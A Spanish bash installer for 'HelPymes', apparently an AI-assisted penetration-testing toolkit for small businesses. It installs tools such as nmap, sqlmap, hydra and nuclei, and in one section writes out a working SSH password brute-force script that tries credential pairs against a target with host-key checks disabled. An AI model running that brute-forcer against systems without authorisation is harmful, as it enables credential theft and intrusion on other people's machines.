#!/bin/bash

# ═══════════════════════════════════════════════════════════
#  HelPymes - Script de Instalación Universal
#  Herramienta de Ciberseguridad para PYMEs
# ═══════════════════════════════════════════════════════════

set -e  # Salir si hay error

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Funciones de utilidad
print_header() {
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
}

print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

print_error() {
    echo -e "${RED}❌ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

# Verificar si se ejecuta como root
if [[ $EUID -eq 0 ]]; then
   print_error "No ejecutes este script como root. Usa tu usuario normal."
   exit 1
fi

print_header "HelPymes - Instalación de Dependencias"

# Detectar sistema operativo
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    VER=$VERSION_ID
else
    print_error "No se puede detectar el sistema operativo"
    exit 1
fi

print_info "Sistema detectado: $OS $VER"

# ═══════════════════════════════════════════════════════════
# 1. ACTUALIZAR REPOSITORIOS
# ═══════════════════════════════════════════════════════════

print_header "Actualizando repositorios del sistema"

if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
    sudo apt update
    print_success "Repositorios actualizados"
elif [[ "$OS" == "fedora" ]] || [[ "$OS" == "rhel" ]] || [[ "$OS" == "rocky" ]]; then
    sudo dnf update -y
    print_success "Repositorios actualizados"
elif [[ "$OS" == "arch" ]] || [[ "$OS" == "manjaro" ]]; then
    sudo pacman -Syu --noconfirm
    print_success "Repositorios actualizados"
else
    print_warning "Sistema operativo no reconocido completamente, intentando continuar..."
fi

# ═══════════════════════════════════════════════════════════
# 2. INSTALAR PYTHON Y PIP
# ═══════════════════════════════════════════════════════════

print_header "Instalando Python 3 y pip"

if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
    sudo apt install -y python3 python3-pip python3-venv git curl wget
    print_success "Python 3 y pip instalados"
elif [[ "$OS" == "fedora" ]] || [[ "$OS" == "rhel" ]] || [[ "$OS" == "rocky" ]]; then
    sudo dnf install -y python3 python3-pip python3-devel git curl wget
    print_success "Python 3 y pip instalados"
elif [[ "$OS" == "arch" ]] || [[ "$OS" == "manjaro" ]]; then
    sudo pacman -S --noconfirm python python-pip git curl wget
    print_success "Python 3 y pip instalados"
fi

# ═══════════════════════════════════════════════════════════
# 3. INSTALAR HERRAMIENTAS DE KALI (si no están)
# ═══════════════════════════════════════════════════════════

print_header "Instalando herramientas de seguridad"

TOOLS_TO_INSTALL=""

# Verificar qué herramientas faltan
command -v nmap >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL nmap"
command -v gobuster >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL gobuster"
command -v nikto >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL nikto"
command -v sqlmap >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL sqlmap"
command -v hydra >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL hydra"
command -v john >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL john"
command -v wpscan >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL wpscan"
command -v dirb >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL dirb"
command -v enum4linux >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL enum4linux"
command -v sshpass >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL sshpass"
command -v nuclei >/dev/null 2>&1 || print_warning "Nuclei no encontrado, se instalará manualmente"

if [[ ! -z "$TOOLS_TO_INSTALL" ]]; then
    print_info "Instalando: $TOOLS_TO_INSTALL"

    if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
        sudo apt install -y $TOOLS_TO_INSTALL
    elif [[ "$OS" == "fedora" ]] || [[ "$OS" == "rhel" ]] || [[ "$OS" == "rocky" ]]; then
        sudo dnf install -y $TOOLS_TO_INSTALL
    elif [[ "$OS" == "arch" ]] || [[ "$OS" == "manjaro" ]]; then
        sudo pacman -S --noconfirm $TOOLS_TO_INSTALL
    fi

    print_success "Herramientas básicas instaladas"
else
    print_success "Todas las herramientas básicas ya están instaladas"
fi

# ═══════════════════════════════════════════════════════════
# 4. INSTALAR NUCLEI (manualmente)
# ═══════════════════════════════════════════════════════════

if ! command -v nuclei &> /dev/null; then
    print_info "Instalando Nuclei..."

    # Instalar Go si no está instalado (necesario para nuclei)
    if ! command -v go &> /dev/null; then
        print_info "Instalando Go..."
        wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        export PATH=$PATH:/usr/local/go/bin
        echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
        rm /tmp/go.tar.gz
        print_success "Go instalado"
    fi

    # Instalar nuclei usando Go
    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    sudo cp ~/go/bin/nuclei /usr/local/bin/
    print_success "Nuclei instalado"

    # Actualizar templates de nuclei
    nuclei -update-templates
    print_success "Templates de Nuclei actualizados"
else
    print_success "Nuclei ya está instalado"
    nuclei -update-templates 2>/dev/null || print_warning "No se pudieron actualizar templates de Nuclei"
fi

# ═══════════════════════════════════════════════════════════
# 5. INSTALAR GITLEAKS
# ═══════════════════════════════════════════════════════════

if ! command -v gitleaks &> /dev/null; then
    print_info "Instalando Gitleaks..."

    GITLEAKS_VERSION="8.18.1"
    wget https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz -O /tmp/gitleaks.tar.gz
    tar -xzf /tmp/gitleaks.tar.gz -C /tmp/
    sudo mv /tmp/gitleaks /usr/local/bin/
    rm /tmp/gitleaks.tar.gz
    print_success "Gitleaks instalado"
else
    print_success "Gitleaks ya está instalado"
fi

# ═══════════════════════════════════════════════════════════
# 6. INSTALAR DEPENDENCIAS PYTHON
# ═══════════════════════════════════════════════════════════

print_header "Instalando dependencias Python"

# Instalar desde requirements.txt
if [ -f "requirements.txt" ]; then
    print_info "Instalando desde requirements.txt..."
    pip3 install -r requirements.txt --break-system-packages 2>/dev/null || pip3 install -r requirements.txt
    print_success "Dependencias Python instaladas desde requirements.txt"
else
    print_warning "No se encontró requirements.txt, instalando dependencias manualmente..."

    # Instalar paquetes uno por uno
    PYTHON_PACKAGES=(
        "anthropic>=0.39.0"
        "groq>=0.4.1"
        "flask>=3.0.0"
        "requests>=2.31.0"
        "semgrep>=1.50.0"
        "bandit>=1.7.5"
    )

    for package in "${PYTHON_PACKAGES[@]}"; do
        print_info "Instalando $package..."
        pip3 install "$package" --break-system-packages 2>/dev/null || pip3 install "$package"
    done

    print_success "Dependencias Python instaladas manualmente"
fi

# Instalar pip-audit (opcional)
print_info "Instalando pip-audit (análisis de dependencias)..."
pip3 install pip-audit --break-system-packages 2>/dev/null || pip3 install pip-audit
print_success "pip-audit instalado"

# ═══════════════════════════════════════════════════════════
# 7. INSTALAR WHATWEB (si no está)
# ═══════════════════════════════════════════════════════════

if ! command -v whatweb &> /dev/null; then
    print_info "Instalando WhatWeb..."

    if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
        sudo apt install -y whatweb
    else
        # Instalar desde GitHub
        git clone https://github.com/urbanadventurer/WhatWeb.git /tmp/whatweb
        cd /tmp/whatweb
        sudo make install
        cd -
        rm -rf /tmp/whatweb
    fi

    print_success "WhatWeb instalado"
else
    print_success "WhatWeb ya está instalado"
fi

# ═══════════════════════════════════════════════════════════
# 8. CREAR SCRIPT SSHCONNECT
# ═══════════════════════════════════════════════════════════

print_header "Configurando script sshconnect"

# Crear directorio bin si no existe
mkdir -p ~/bin

# Crear script sshconnect
cat > ~/bin/sshconnect << 'SSHCONNECT_EOF'
#!/bin/bash

TARGET=$1
CREDENTIALS_FILE=$2
PORT=${3:-22}

# Validación
if [ -z "$TARGET" ] || [ -z "$CREDENTIALS_FILE" ]; then
    echo "Error: Uso: $0 <target> <credentials_file> [port]" >&2
    exit 1
fi

if [ ! -f "$CREDENTIALS_FILE" ]; then
    echo "Error: Archivo '$CREDENTIALS_FILE' no encontrado" >&2
    exit 1
fi

echo "🔐 Iniciando SSH bruteforce"
echo "🎯 Target: $TARGET:$PORT"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

SUCCESS=false

while IFS=':' read -r USER PASSWORD; do
    [[ -z "$USER" || "$USER" =~ ^# ]] && continue

    USER=$(echo "$USER" | xargs)
    PASSWORD=$(echo "$PASSWORD" | xargs)

    echo "🔑 Probando: $USER"

    if sshpass -p "$PASSWORD" ssh -p "$PORT" -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$TARGET" "exit" 2>/dev/null; then
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "✅ CREDENCIALES VÁLIDAS:"
        echo "   Usuario: $USER"
        echo "   Password: $PASSWORD"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
        SUCCESS=true
        break
    fi
done < "$CREDENTIALS_FILE"

if [ "$SUCCESS" = false ]; then
    echo "❌ No se encontraron credenciales válidas"
    exit 1
fi

exit 0
SSHCONNECT_EOF

# Dar permisos de ejecución
chmod +x ~/bin/sshconnect

# Crear symlink en /usr/local/bin
sudo ln -sf ~/bin/sshconnect /usr/local/bin/sshconnect

print_success "Script sshconnect configurado"

# ═══════════════════════════════════════════════════════════
# 9. DAR PERMISOS DE EJECUCIÓN A SCRIPTS
# ═══════════════════════════════════════════════════════════

print_header "Configurando permisos de ejecución"

chmod +x chat_kali_api.py 2>/dev/null || print_warning "chat_kali_api.py no encontrado"
chmod +x chat_claude.py 2>/dev/null || print_warning "chat_claude.py no encontrado"
chmod +x kali_server.py 2>/dev/null || print_warning "kali_server.py no encontrado"

print_success "Permisos configurados"

# ═══════════════════════════════════════════════════════════
# 10. VERIFICAR INSTALACIÓN
# ═══════════════════════════════════════════════════════════

print_header "Verificando instalación"

# Verificar Python
if command -v python3 &> /dev/null; then
    PYTHON_VERSION=$(python3 --version)
    print_success "Python: $PYTHON_VERSION"
else
    print_error "Python 3 no está instalado correctamente"
fi

# Verificar herramientas críticas
CRITICAL_TOOLS=(
    "nmap"
    "gobuster"
    "nikto"
    "sqlmap"
    "hydra"
    "nuclei"
    "sshpass"
    "gitleaks"
    "semgrep"
)

MISSING_TOOLS=()

for tool in "${CRITICAL_TOOLS[@]}"; do
    if command -v $tool &> /dev/null; then
        print_success "$tool instalado"
    else
        print_error "$tool NO encontrado"
        MISSING_TOOLS+=("$tool")
    fi
done

# Verificar paquetes Python
print_info "Verificando paquetes Python..."
python3 -c "import anthropic, groq, flask, requests, semgrep" 2>/dev/null && print_success "Paquetes Python OK" || print_warning "Algunos paquetes Python pueden faltar"

# ═══════════════════════════════════════════════════════════
# 11. CONFIGURAR VARIABLES DE ENTORNO (recordatorio)
# ═══════════════════════════════════════════════════════════

print_header "Configuración de API Keys"

print_info "IMPORTANTE: Necesitas configurar tus API keys"
echo ""
print_warning "Ejecuta estos comandos para configurar tus API keys:"
echo ""

# Detectar shell del usuario
USER_SHELL=$(basename "$SHELL")

if [[ "$USER_SHELL" == "zsh" ]]; then
    echo -e "${CYAN}nano ~/.zshrc${NC}"
elif [[ "$USER_SHELL" == "bash" ]]; then
    echo -e "${CYAN}nano ~/.bashrc${NC}"
else
    echo -e "${CYAN}nano ~/.profile${NC}"
fi

echo ""
echo "Añade al final del archivo:"
echo ""
echo -e "${GREEN}export GROQ_API_KEY=\"tu_api_key_de_groq\"${NC}"
echo -e "${GREEN}export ANTHROPIC_API_KEY=\"tu_api_key_de_claude\"${NC}"
echo ""
print_info "Obtén tus API keys en:"
echo "  • Groq: https://console.groq.com/keys"
echo "  • Anthropic: https://console.anthropic.com/settings/keys"
echo ""

# ═══════════════════════════════════════════════════════════
# 12. RESUMEN FINAL
# ═══════════════════════════════════════════════════════════

print_header "Resumen de Instalación"

if [ ${#MISSING_TOOLS[@]} -eq 0 ]; then
    print_success "✨ Instalación completada exitosamente!"
    echo ""
    print_info "Pasos siguientes:"
    echo "  1. Configura tus API keys (ver instrucciones arriba)"
    echo "  2. Recarga tu shell: source ~/.bashrc (o ~/.zshrc)"
    echo "  3. Inicia el servidor: ./kali_server.py"
    echo "  4. Inicia el chat: ./chat_kali_api.py o ./chat_claude.py"
    echo ""
    print_success "¡Todo listo para usar HelPymes!"
else
    print_warning "Instalación completada con advertencias"
    echo ""
    print_error "Herramientas faltantes:"
    for tool in "${MISSING_TOOLS[@]}"; do
        echo "  • $tool"
    done
    echo ""
    print_info "Puedes instalarlas manualmente o continuar sin ellas"
fi

echo ""
print_info "Documentación: https://github.com/asiermv2/HelPymes"
print_info "Soporte: asiermv2@gmail.com"
echo ""

# ═══════════════════════════════════════════════════════════
# FIN
# ═══════════════════════════════════════════════════════════
